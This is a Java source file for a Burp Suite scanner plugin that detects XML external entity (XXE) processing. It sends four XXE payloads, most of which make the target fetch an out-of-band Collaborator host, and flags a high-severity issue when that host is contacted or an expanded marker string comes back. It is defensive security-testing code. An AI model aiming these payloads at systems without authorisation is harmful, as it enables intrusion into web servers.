package com.yandex.burp.extensions.plugins.audit;

import burp.*;
import com.yandex.burp.extensions.plugins.CustomScanIssue;
import com.yandex.burp.extensions.plugins.config.BurpMollyPackConfig;

import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

/**
 * Created by a-abakumov on 13/02/2017.
 */
public class XXEPlugin implements IAuditPlugin {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private HashSet<String> flags;

    private static final List<String> XXEPayloads = new ArrayList<>();

    private final int ISSUE_TYPE = 0x080a0006;
    private final String ISSUE_NAME = "XXE Molly";
    private final String SEVERITY = "High";
    private final String CONFIDENCE = "Certain";

    public XXEPlugin(IBurpExtenderCallbacks callbacks, BurpMollyPackConfig extConfig) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.flags = new HashSet<>();
        initXXEPayloads();
    }

    public void initXXEPayloads() {
        XXEPayloads.add("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE test [\n<!ENTITY % remote SYSTEM \"http://{collaboratorPayload}/\">\n%remote;\n]><test>test</test>");
        XXEPayloads.add("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE root PUBLIC \"-//B/A/EN\" \"http://{collaboratorPayload}/\"><root>a0e5c</root>");
        XXEPayloads.add("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe1 \"dryat\"><!ENTITY xxe2 \"0Uct\"><!ENTITY xxe3 \"333\"><!ENTITY xxe \"&xxe1;&xxe3;&xxe2;\">]><methodCall><methodName>BalanceSimple.CreateOrderOrSubscription</methodName><params><param><value><string>&xxe;test</string></value></param><param>x</params></methodCall>");
        XXEPayloads.add("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE tst SYSTEM \"http://{collaboratorPayload}\">\n<tst></tst>");
    }

    @Override
    public List<IScanIssue> doScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        IResponseInfo resp = helpers.analyzeResponse(baseRequestResponse.getResponse());
        IRequestInfo req = helpers.analyzeRequest(baseRequestResponse.getRequest());
        if (resp == null | req == null) return null;

        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        if (flags.contains(url.toString())) return null;
        else flags.add(url.toString());

        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String collaboratorPayload = collaboratorContext.generatePayload(true);
        List<IScanIssue> issues = new ArrayList<>();

        for (String xxe : XXEPayloads) {
            xxe = xxe.replace("{collaboratorPayload}", collaboratorPayload);
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            headers.set(0, headers.get(0).replace("GET", "POST"));
            headers.removeIf(header -> header != null && header.toLowerCase().startsWith("content-type:"));
            headers.add("Content-type: application/xml");

            byte[] attackBody = helpers.buildHttpMessage(headers, helpers.stringToBytes(xxe));
            IHttpRequestResponse attackRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attackBody);
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(collaboratorPayload);

            if (attackRequestResponse != null && attackRequestResponse.getResponse() != null
                    && collaboratorInteractions != null
                    && (!collaboratorInteractions.isEmpty() || helpers.bytesToString(attackRequestResponse.getResponse()).contains("dryat0Uct333"))) {
                String attackDetails = "XXE processing is enabled at: \n" + helpers.analyzeRequest(attackRequestResponse).getUrl().toString();

                issues.add(new CustomScanIssue(attackRequestResponse.getHttpService(),
                        helpers.analyzeRequest(attackRequestResponse).getUrl(),
                        new IHttpRequestResponse[]{callbacks.applyMarkers(attackRequestResponse, null, null)},
                        attackDetails, ISSUE_TYPE, ISSUE_NAME, SEVERITY, CONFIDENCE,
                        "", "", ""));
            }
        }
        return issues.isEmpty() ? null : issues;
    }
}
